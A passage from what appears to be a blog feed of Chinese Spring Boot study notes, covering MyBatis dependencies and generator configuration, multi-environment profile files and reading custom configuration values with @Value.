class="comment">//SpringBoot核心注解，主要用于开启spring自动配置</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(Application.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后还要在src&#x2F;main&#x2F;resources中创建如下文件、文件夹：</p><ul><li>static(文件夹)：图标等静态资源放入此文件夹</li><li>templates(文件夹)：模板，前端模板引擎放入此文件夹Thyme leaf.html（百叶箱）</li><li>application.properties：SpringBoot的核心配置文件</li></ul><h2 id="0x03-SpringBoot继承Mybatis"><a href="#0x03-SpringBoot继承Mybatis" class="headerlink" title="0x03 SpringBoot继承Mybatis"></a>0x03 SpringBoot继承Mybatis</h2><h3 id="0x0301-添加Mybatis依赖和数据库驱动-mysql"><a href="#0x0301-添加Mybatis依赖和数据库驱动-mysql" class="headerlink" title="0x0301 添加Mybatis依赖和数据库驱动(mysql)"></a>0x0301 添加<code>Mybatis依赖</code>和<code>数据库驱动(mysql)</code></h3><p>Pom.xml中添加依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--        Mysql驱动--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        Mybatis整合SpringBoot框架的起步依赖--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="0x0302-使用Mybatis提供的逆向工程生成实体Bean，映射文件，BAO接口。"><a href="#0x0302-使用Mybatis提供的逆向工程生成实体Bean，映射文件，BAO接口。" class="headerlink" title="0x0302 使用Mybatis提供的逆向工程生成实体Bean，映射文件，BAO接口。"></a>0x0302 使用Mybatis提供的逆向工程生成实体Bean，映射文件，BAO接口。</h3><p>pom.xml添加依赖和插件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        Mybatis整合SpringBoot框架的起步依赖--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.5.7<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.generator<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-generator-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.generator<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-generator-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--                Mybatis 代码自动生成插件--&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.generator<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-generator-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"> <span class="comment">&lt;!--                    配置文件的位置--&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">configurationFile</span>&gt;</span>GeneratorMapper.xml<span class="tag">&lt;/<span class="name">configurationFile</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">verbose</span>&gt;</span>true<span class="tag">&lt;/<span class="name">verbose</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">overwrite</span>&gt;</span>true<span class="tag">&lt;/<span class="name">overwrite</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><p>根目录下新建一个xml文件，文件名为：<code>GeneratorMapper</code>:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">generatorConfiguration</span></span></span><br><span class="line"><span class="meta">        <span class="keyword">PUBLIC</span> <span class="string">&quot;-//mybatis.org//DTD MyBatis Generator Configuration 1.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">generatorConfiguration</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--    指定连接数据库的JDBC驱动包所在位置,指定到你本机的完整路径--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">classPathEntry</span> <span class="attr">location</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--    配置table表信息内容体，targetRuntime 指定采用Mybatis3的版本--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context</span> <span class="attr">id</span>=<span class="string">&quot;tables&quot;</span> <span class="attr">targetRuntime</span>=<span class="string">&quot;Mybatis3&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--        抑制生成注释，由于生成的注释都是英文的，可以不让它生成--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">commentGenerator</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;suppressAllComments&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">commentGenerator</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--        配置数据库连接信息--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">jdbcConnection</span> <span class="attr">driverClass</span>=<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span></span></span><br><span class="line"><span class="tag">                        <span class="attr">connectionURL</span>=<span class="string">&quot;jdbc:mysql://localhost:3306/springboot&quot;</span></span></span><br><span class="line"><span class="tag">                        <span class="attr">userId</span>=<span class="string">&quot;root&quot;</span></span></span><br><span class="line"><span class="tag">                        <span class="attr">password</span>=<span class="string">&quot;admin123456&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">jdbcConnection</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--        生成model类，targetPackage指定model类的包名 ，targetProject指定生成的model放在eclipse的哪个工程下面--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">javaModelGenerator</span> <span class="attr">targetPackage</span>=<span class="string">&quot;com.auspic1ous.springboot.model&quot;</span></span></span><br><span class="line"><span class="tag">                            <span class="attr">targetProject</span>=<span class="string">&quot;src/main/java&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;enableSubPackages&quot;</span> <span class="attr">value</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;trimStrings&quot;</span> <span class="attr">value</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">javaModelGenerator</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--        生成 Mybatis 的 Mapper.xml文件，targetPackage指定mapper.xml 文件的包名，</span></span><br><span class="line"><span class="comment">        targetProject指定生成的mapper.xml放在eclipse的哪个工程下面--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">sqlMapGenerator</span> <span class="attr">targetPackage</span>=<span class="string">&quot;com.auspic1ous.springboot.mapper&quot;</span></span></span><br><span class="line"><span class="tag">                         <span class="attr">targetProject</span>=<span class="string">&quot;src/main/java&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;enableSubPackages&quot;</span> <span class="attr">value</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">sqlMapGenerator</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--        生成Mybatis 的Mapper接口类文件, targetPackage 指定 Mapper 接口类的包名</span></span><br><span class="line"><span class="comment">        ,targetProject 指定生成的Mapper接口放在eclipse的哪个工程下面--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">javaClientGenerator</span> <span class="attr">type</span>=<span class="string">&quot;XMLMAPPER&quot;</span></span></span><br><span class="line"><span class="tag">                             <span class="attr">targetPackage</span>=<span class="string">&quot;com.auspic1ous.springboot.mapper&quot;</span></span></span><br><span class="line"><span class="tag">                             <span class="attr">targetProject</span>=<span class="string">&quot;src/main/java&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;enableSubPackages&quot;</span> <span class="attr">value</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">javaClientGenerator</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--        数据库表名以及对应的Java模型类名--&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--        tableName数据库表的名称，domainObjectName为java实体类的名字--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">table</span> <span class="attr">tableName</span>=<span class="string">&quot;t_student&quot;</span> <span class="attr">domainObjectName</span>=<span class="string">&quot;Student&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">enableCountByExample</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">enableUpdateByExample</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">enableDeleteByExample</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">enableSelectByExample</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">selectByExampleQueryId</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">context</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">generatorConfiguration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后在com.auspic1ous.springboot下创建mapper和model两个包。</p><p>当我们重新构建该项目后，mapper中就会根据数据库自动生成对应的接口类和映射文件xml，model中就会根据数据库自动生成对应的java模型，这样就节省了 我们手动编写mapper和model两个文件夹里面的内容，非常好用~</p>]]></content>
      
      
      <categories>
          
          <category> 后端学习 </category>
          
          <category> SpringBoot </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 后端 </tag>
            
            <tag> Spring </tag>
            
            <tag> SpringBoot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 学习笔记 02</title>
      <link href="/2021/08/03/5fffb9c70d6b-q1jun/"/>
      <url>/2021/08/03/5fffb9c70d6b-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="Spring-Boot学习笔记-02"><a href="#Spring-Boot学习笔记-02" class="headerlink" title="Spring Boot学习笔记 02"></a>Spring Boot学习笔记 02</h1><p>​        </p><h2 id="0x01-多环境下核心配置文件的使用-properties"><a href="#0x01-多环境下核心配置文件的使用-properties" class="headerlink" title="0x01 多环境下核心配置文件的使用(properties)"></a>0x01 多环境下核心配置文件的使用(properties)</h2><blockquote><p>需要注意.properties中的属性值不要出现空格，会被识别出现问题！</p></blockquote><p>在工作中的开发环境有</p><ul><li>开发环境(dev)</li><li>测试环境(test)</li><li>准生产环境(pre)</li><li>生产环境(product)</li></ul><p>老样子，我们在创建号的SpringBoot环境下，在Application.java文件的同级目录或下级目录创建一个Controller&#x2F;IndexController.java，内容如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.springboot.springboot006multienvironment.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/say&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">say</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello Multi-Environment!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>下面我们分别对应上面四个开发环境创建对应的核心配置文件:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">touch application.properties</span><br><span class="line">touch application-dev.properties</span><br><span class="line">touch application-test.properties</span><br><span class="line">touch application-pre.properties</span><br><span class="line">touch application-product.properties</span><br></pre></td></tr></table></figure><p>每个环境的核心配置文件名的格式都是 <code>application-XXXX.properties</code> 其中的<code>XXXX</code>由自己命名，并在 <strong>主核心配置文件</strong> 中调用:</p><p>application.properties:</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Springboot主核心配置文件</span></span><br><span class="line"><span class="comment">#激活使用的配置文件,XXXX对应文件名中的XXXX</span></span><br><span class="line"><span class="attr">spring.profiles.active</span>=<span class="string">XXXX</span></span><br></pre></td></tr></table></figure><p>其他核心配置文件则与原来单核心配置文件相同：</p><p>application-dev.properties:</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server.port</span>=<span class="string">8080</span></span><br><span class="line"><span class="attr">server.servlet.context-path</span>=<span class="string">/dev</span></span><br></pre></td></tr></table></figure><p>application-test.properties:</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server.port</span>=<span class="string">8081</span></span><br><span class="line"><span class="attr">server.servlet.context-path</span>=<span class="string">/test</span></span><br></pre></td></tr></table></figure><p>application-pre.properties:</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server.port</span>=<span class="string">8082</span></span><br><span class="line"><span class="attr">server.servlet.context-path</span>=<span class="string">/pre</span></span><br></pre></td></tr></table></figure><p>application-product.properties:</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server.port</span>=<span class="string">8083</span></span><br><span class="line"><span class="attr">server.servlet.context-path</span>=<span class="string">/product</span></span><br></pre></td></tr></table></figure><p>这样我们就完成了在不同环境下的核心配置文件配置，浏览器URL框输入时区分默认路径即可。</p><p>比如输入<a target="_blank" rel="noopener" href="http://localhost:8081/test/say">http://localhost:8081/test/say</a> 就会显示出我们在IndexController中创建的函数say返回的内容”Hello Multi-Environment!”。</p><h2 id="0x02-多环境下的核心配置文件的使用-yml"><a href="#0x02-多环境下的核心配置文件的使用-yml" class="headerlink" title="0x02 多环境下的核心配置文件的使用(yml)"></a>0x02 多环境下的核心配置文件的使用(yml)</h2><p>yml(或者yaml)与properties文件的配置方法大同小异，只有文件内容格式上的差异，其他基本一样。</p><p>所以这里只给出配置后的核心文件的内容：</p><p>application.yml:</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">profiles:</span></span><br><span class="line">    <span class="attr">active:</span> <span class="string">dev</span></span><br></pre></td></tr></table></figure><p>application-dev.yml:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8080</span></span><br><span class="line">  <span class="attr">servlet:</span></span><br><span class="line">    <span class="attr">context-path:</span> <span class="string">/dev</span></span><br></pre></td></tr></table></figure><p>application-test.yml:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8081</span></span><br><span class="line">  <span class="attr">servlet:</span></span><br><span class="line">    <span class="attr">context-path:</span> <span class="string">/test</span></span><br></pre></td></tr></table></figure><p>application-product.yml:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8082</span></span><br><span class="line">  <span class="attr">servlet:</span></span><br><span class="line">    <span class="attr">context-path:</span> <span class="string">/product</span></span><br></pre></td></tr></table></figure><p>application-pre.yml:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8083</span></span><br><span class="line">  <span class="attr">servlet:</span></span><br><span class="line">    <span class="attr">context-path:</span> <span class="string">/pre</span></span><br></pre></td></tr></table></figure><h2 id="0x03-获取application-properties-yml-自定义配置"><a href="#0x03-获取application-properties-yml-自定义配置" class="headerlink" title="0x03 获取application.properties(.yml)自定义配置"></a>0x03 获取application.properties(.yml)自定义配置</h2><p>上面我们用的配置诸如<code>server.port=</code> <code>server.servlet.context-path=</code> 等等都是SpringBoot项目自带的配置项，如何自己创建一个自定义配置并获取它呢？</p><p>这里我们使用到__@Value__</p><p>在Application.java文件的同级目录或下级目录创建一个Controller&#x2F;IndexController.java，内容如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.spring.springboot008customerconfiguration.Controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexController</span> &#123;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;school.name&#125;&quot;)</span><span class="comment">//创建school.name配置项，存放到String类型的变量中</span></span><br><span class="line">    <span class="keyword">private</span> String schoolName;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;website&#125;&quot;)</span><span class="comment">//创建website配置项，存放到String类型的变量中</span></span><br><span class="line">    <span class="keyword">private</span> String website;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/say&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">say</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//输出获得的自定义配置</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello :&quot;</span> + schoolName + <span class="string">&quot; Website : http://&quot;</span> + website;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>配置文件application.properties中:</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#设置内嵌tomcat 端口号</span></span><br><span class="line"><span class="attr">server.port</span>=<span class="string">8080</span></span><br><span class="line"><span class="comment">#设置上下文根</span></span><br><span class="line"><span class="attr">server.servlet.context-path</span>=<span class="string">/</span></span><br><span class="line"><span class="comment">#自定义</span></span><br><span class="line"><span class="attr">school.name</span>=<span class="string">ECJTU</span></span><br><span class="line"><span class="attr">website</span>=<span class="string">www.ecjtu.jx.cn</span></span><br></pre></td></tr></table></figure><p>运行项目后我们打开浏览器输入<a target="_blank" rel="noopener" href="http://localhost:8080/say,%E6%B5%8F%E8%A7%88%E5%99%A8%E6%98%BE%E7%A4%BA">http://localhost:8080/say,浏览器显示</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello :ECJTU Website : http://www.ecjtu.jx.cn</span><br></pre></td></tr></table></figure><p>说明我们获取成功。</p><h2 id="0x04-成组获取自定义配置对象"><a href="#0x04-成组获取自定义配置对象" class="headerlink" title="0x04 成组获取自定义配置对象"></a>0x04 成组获取自定义配置对象</h2><p>上一个部分0x03中，我们获取自定义配置是一个一个获取的，我们如何一组一组的获取呢，比如我们现在创建的application.properties文件如下：</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#设置内嵌tomcat 端口号</span></span><br><span class="line"><span class="attr">server.port</span>=<span class="string">8080</span></span><br><span class="line"><span class="comment">#设置上下文根</span></span><br><span class="line"><span class="attr">server.servlet.context-path</span>=<span class="string">/</span></span><br><span class="line"></span><br><span class="line"><span class="attr">school.name</span>=<span class="string">ECJTU</span></span><br><span class="line"><span class="attr">school.website</span>=<span class="string">www.ecjtu.jx.cn</span></span><br><span class="line"></span><br><span class="line"><span class="attr">department.name</span>=<span class="string">ECJTU1</span></span><br><span class="line"><span class="attr">department.website</span>=<span class="string">www.ecjtu1.jx.cn</span></span><br></pre></td></tr></table></figure><p>如何把school和department的name和website属性分别存到他们对应的构造体里面呢。</p><p>我们在application.java同级目录或下级目录中分别创建school.java和department.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span 